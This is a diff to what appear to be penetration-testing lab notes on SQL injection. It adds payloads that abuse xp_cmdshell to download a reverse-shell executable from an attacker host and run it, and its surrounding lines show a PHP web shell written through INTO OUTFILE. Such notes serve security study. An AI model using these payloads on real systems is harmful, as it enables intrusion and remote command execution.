@@ -82,6 +82,16 @@ after we connect to the db
     $ RECONFIGURE;
     $ EXECUTE xp_cmdshell 'whoami';
 
+we can leverage a blind sql injection with xp_cmdshell enabled to download a reverse shell with ps
+
+    admin' EXEC xp_cmdshell "powershell iex(iwr http://192.168.45.215:8000/rs443.exe -Outfile C:\Users\Public\rs443.exe)" --
+    
+the shell needs to be downloaded to a dir with exec privs
+
+then we can execute
+
+    admin' EXEC xp_cmdshell "(C:\Users\Public\rs443.exe)" --
+
 we can write files on the server with SELECT INTO_OUTFILE
 
     $ ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
